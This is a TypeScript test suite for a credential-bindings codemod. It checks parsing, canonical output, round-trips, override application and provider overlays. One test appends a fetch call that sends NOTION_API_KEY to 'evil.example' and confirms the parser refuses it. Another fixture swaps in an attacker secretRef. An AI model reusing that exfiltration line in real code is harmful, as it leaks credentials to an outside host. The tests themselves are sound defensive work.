import { assertProvidersValid, executorHomeOf, vercelConnectorHome, vercelConnectorOf, type Provider } from "../agent/access/providers.js";
import {
  applyBindingOverride,
  applyOverridesToProviders,
  emptyCredentialBindingsFile,
  emitCredentialBindingsModule,
  parseCredentialBindingsFile,
  parseCredentialBindingsModule,
  renormalizeCredentialBindingsModule,
  stringifyCredentialBindings,
  CredentialBindingsCodemodError,
  type CredentialBindingsFile,
  type CredentialBindingOverride,
} from "../agent/access/credential-bindings-codemod.js";

let passed = 0;
function ok(cond: boolean, label: string): void {
  if (!cond) {
    console.error(`✗ ${label}`);
    process.exit(1);
  }
  passed++;
}
function throwsWith(fn: () => unknown, fragment: string, label: string): void {
  try {
    fn();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    ok(err instanceof CredentialBindingsCodemodError && msg.includes(fragment), `${label} (message: "${msg}")`);
    return;
  }
  ok(false, `${label} (did not throw)`);
}

const OV: CredentialBindingOverride = { provider: "notion", credential: "team-key", broker: "db", secretRef: "db:notion:team-key" };

ok(parseCredentialBindingsFile({ overrides: [] }).overrides.length === 0, "parse: empty overrides");
ok(parseCredentialBindingsFile({ overrides: [OV] }).overrides[0].secretRef === "db:notion:team-key", "parse: one override");
ok(parseCredentialBindingsModule(emitCredentialBindingsModule(emptyCredentialBindingsFile())).overrides.length === 0, "parse: from module text");

throwsWith(() => parseCredentialBindingsFile(null), "must be a JSON object", "parse: null refused");
throwsWith(() => parseCredentialBindingsFile([]), "must be a JSON object", "parse: array refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [], extra: 1 }), "unknown top-level key", "parse: unknown key refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: {} }), "needs an `overrides` array", "parse: non-array overrides refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "x", credential: "y", broker: "db" }] }), "string { provider, credential, broker, secretRef }", "parse: missing field refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "x", credential: "y", broker: "", secretRef: "z" }] }), "blank field", "parse: blank field refused");
throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "a:b", credential: "y", broker: "db", secretRef: "z" }] }), 'must not contain ":"', "parse: colon in id refused");
throwsWith(
  () => parseCredentialBindingsFile({ overrides: [OV, { ...OV, secretRef: "db:notion:team-key2" }] }),
  "duplicate override",
  "parse: duplicate (provider, credential) refused",
);
ok(parseCredentialBindingsFile({ $comment: "hi", overrides: [] }).overrides.length === 0, "parse: $comment tolerated");

const unordered: CredentialBindingsFile = {
  overrides: [
    { provider: "notion", credential: "team-key", broker: "db", secretRef: "db:notion:team-key" },
    { provider: "linear", credential: "api", broker: "db", secretRef: "db:linear:api" },
  ],
};
const s1 = stringifyCredentialBindings(unordered);
const s2 = stringifyCredentialBindings({ overrides: [...unordered.overrides].reverse() });
ok(s1 === s2, "stringify: byte-identical regardless of input order (sorted by provider, credential)");
ok(s1.endsWith("\n"), "stringify: trailing newline");
ok(stringifyCredentialBindings(parseCredentialBindingsModule(emitCredentialBindingsModule(unordered))) === s1, "stringify: parse∘stringify is a fixpoint");
ok(s1.indexOf('"linear"') < s1.indexOf('"notion"'), "stringify: overrides sorted by provider");
ok(/"provider"[\s\S]*"credential"[\s\S]*"broker"[\s\S]*"secretRef"/.test(s1), "stringify: canonical key order");

{
  const mod = emitCredentialBindingsModule(unordered);
  ok(mod.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), "module: opens with the machine-owned banner");
  ok(
    mod.includes('\nimport type { CredentialBindingsFile } from "@open-everywhere/core/agent/access/credential-bindings-codemod.js";\n'),
    "module: carries exactly one TYPE-ONLY import",
  );
  ok(mod.endsWith(" satisfies CredentialBindingsFile;\n"), "module: ends with the satisfies clause + newline");
  ok(mod.split("export default").length === 2, "module: exactly one `export default`");
  ok(emitCredentialBindingsModule(parseCredentialBindingsModule(mod)) === mod, "module: emit ∘ parseModule is a fixpoint");
  throwsWith(
    () => parseCredentialBindingsModule(mod + 'await fetch("https://evil.example", { body: process.env.NOTION_API_KEY });\n'),
    "must contain exactly one",
    "module: a hand-added statement is REFUSED (the format admits no code)",
  );
  const tampered = mod.replace('"db:notion:team-key"', '"db:notion:attacker-key"');
  ok(tampered !== mod, "module: (fixture) the secretRef edit actually changed the bytes");
  ok(parseCredentialBindingsModule(tampered).overrides.length === 2, "module: (fixture) the tampered body is still well-shaped data");
  const reordered = mod.replace('"provider": "linear"', '"provider": "zzz-linear"');
  ok(reordered !== mod, "module: (fixture) the provider-reorder edit actually changed the bytes");
  throwsWith(
    () => parseCredentialBindingsModule(reordered),
    "not in canonical form",
    "module: a hand-edit that leaves the file non-canonical is REFUSED, not silently rewritten",
  );
  ok(renormalizeCredentialBindingsModule(reordered) === emitCredentialBindingsModule(parseCredentialBindingsFile({ overrides: [{ ...unordered.overrides[1], provider: "zzz-linear" }, unordered.overrides[0]] })), "module: renormalize produces the canonical form of the edited data");
}

{
  const empty = emptyCredentialBindingsFile();
  const first = applyBindingOverride(empty, OV);
  ok(first.changed && first.file.overrides.length === 1, "apply: first override lands (changed:true)");

  const again = applyBindingOverride(first.file, OV);
  ok(!again.changed, "apply: identical re-apply is a no-op (changed:false)");
  ok(stringifyCredentialBindings(again.file) === stringifyCredentialBindings(first.file), "apply: idempotent re-apply is byte-identical");

  const changed = applyBindingOverride(first.file, { ...OV, secretRef: "db:notion:team-key-v2" });
  ok(changed.changed && changed.file.overrides.length === 1, "apply: same (provider, credential) with a NEW stamp REPLACES (still one entry)");
  ok(changed.file.overrides[0].secretRef === "db:notion:team-key-v2", "apply: replacement carries the new ref");

  const second = applyBindingOverride(first.file, { provider: "linear", credential: "api", broker: "db", secretRef: "db:linear:api" });
  ok(second.changed && second.file.overrides.length === 2, "apply: a different credential adds a second override");
}

const notion: Provider = {
  name: "notion",
  connection: "notion",
  allows: ["api-key", "user-oauth"],
  credentials: [
    { id: "team-key", type: "api-key", secretRef: "NOTION_API_KEY", broker: "env" },
    { id: "user-oauth", type: "user-oauth", home: vercelConnectorHome("mcp.notion.com/notion-mcp") },
  ],
};
{
  const base = [notion];
  const merged = applyOverridesToProviders(base, [OV]);
  const cred = merged[0].credentials.find((c) => c.id === "team-key")!;
  ok(cred.broker === "db" && cred.secretRef === "db:notion:team-key", "overlay: team-key re-stamped env → db");
  ok(base[0].credentials.find((c) => c.id === "team-key")!.broker === "env", "overlay: base set is NOT mutated (pure)");
  ok(vercelConnectorOf(merged[0].credentials.find((c) => c.id === "user-oauth")!) === "mcp.notion.com/notion-mcp", "overlay: untouched credential unchanged");
  assertProvidersValid(merged);
  ok(true, "overlay: merged provider set passes assertProvidersValid");

  const stale = applyOverridesToProviders(base, [{ provider: "notion", credential: "ghost", broker: "db", secretRef: "db:notion:ghost" }]);
  ok(stale[0].credentials.length === 2 && !stale[0].credentials.some((c) => c.id === "ghost"), "overlay: stale override is inert");
  ok(applyOverridesToProviders(base, []) === base, "overlay: empty overrides returns the base set unchanged");
}

const EXEC_OV: CredentialBindingOverride = {
  provider: "notion",
  credential: "team-key",
  executor: { integration: "notion-mcp", owner: "org", connection: "oe-notion-team-key" },
};
{
  const parsed = parseCredentialBindingsFile({ overrides: [EXEC_OV] }).overrides[0];
  ok(parsed.executor?.connection === "oe-notion-team-key" && parsed.broker === undefined && parsed.secretRef === undefined, "parse: executor-home override (no broker/secretRef)");

  throwsWith(
    () => parseCredentialBindingsFile({ overrides: [{ provider: "n", credential: "k", broker: "db", secretRef: "db:n:k", executor: EXEC_OV.executor }] }),
    "BOTH a broker home and an executor home",
    "parse: broker+executor on one override refused (one home)",
  );
  throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "n", credential: "k" }] }), "has no home", "parse: an override with NO home refused");
  throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "n", credential: "k", executor: { integration: "i", owner: "o" } }] }), "{ integration, owner, connection }", "parse: executor home missing a field refused");
  throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "n", credential: "k", executor: { integration: "i", owner: "", connection: "oe-c" } }] }), "blank field", "parse: executor home blank field refused");
  throwsWith(() => parseCredentialBindingsFile({ overrides: [{ provider: "n", credential: "k", executor: { integration: "i:x", owner: "o", connection: "oe-c" } }] }), 'must not contain ":"', "parse: executor home colon-in-segment refused");

  const s = stringifyCredentialBindings({ overrides: [EXEC_OV] });
  ok(
    s.endsWith("\n") && stringifyCredentialBindings(parseCredentialBindingsModule(emitCredentialBindingsModule({ overrides: [EXEC_OV] }))) === s,
    "stringify: executor override round-trips (fixpoint)",
  );
  ok(/"provider"[\s\S]*"credential"[\s\S]*"executor"[\s\S]*"integration"[\s\S]*"owner"[\s\S]*"connection"/.test(s), "stringify: executor override canonical key order (incl. ordered sub-object)");
  ok(!s.includes('"broker"') && !s.includes('"secretRef"'), "stringify: an executor override emits NO broker/secretRef keys");

  const first = applyBindingOverride(emptyCredentialBindingsFile(), EXEC_OV);
  ok(first.changed && first.file.overrides[0].executor?.connection === "oe-notion-team-key", "apply: executor override lands (changed:true)");
  ok(!applyBindingOverride(first.file, EXEC_OV).changed, "apply: identical executor re-apply is a no-op (changed:false)");
  const dbToExec = applyBindingOverride(applyBindingOverride(emptyCredentialBindingsFile(), OV).file, { provider: "notion", credential: "team-key", executor: EXEC_OV.executor });
  ok(dbToExec.changed && dbToExec.file.overrides.length === 1 && dbToExec.file.overrides[0].executor !== undefined, "apply: re-homing broker → executor REPLACES (one entry, now executor)");
  const execMoved = applyBindingOverride(first.file, { provider: "notion", credential: "team-key", executor: { integration: "notion-mcp", owner: "org", connection: "oe-notion-team-key-v2" } });
  ok(execMoved.changed && execMoved.file.overrides[0].executor?.connection === "oe-notion-team-key-v2", "apply: a different executor address REPLACES");
}

{
  const base = [notion];
  const merged = applyOverridesToProviders(base, [EXEC_OV]);
  const cred = merged[0].credentials.find((c) => c.id === "team-key")!;
  ok(executorHomeOf(cred)?.connection === "oe-notion-team-key", "overlay(exec): team-key re-homed to the Executor connection");
  ok(cred.broker === undefined && cred.secretRef === undefined, "overlay(exec): the broker/secretRef stamps are STRIPPED (one home, mutual exclusivity)");
  ok(base[0].credentials.find((c) => c.id === "team-key")!.broker === "env", "overlay(exec): base set NOT mutated (pure)");
  assertProvidersValid(merged);
  ok(true, "overlay(exec): merged provider set with an executor-homed credential passes assertProvidersValid");
}

console.log(`✓ credential-bindings-codemod: ${passed} assertions passed`);
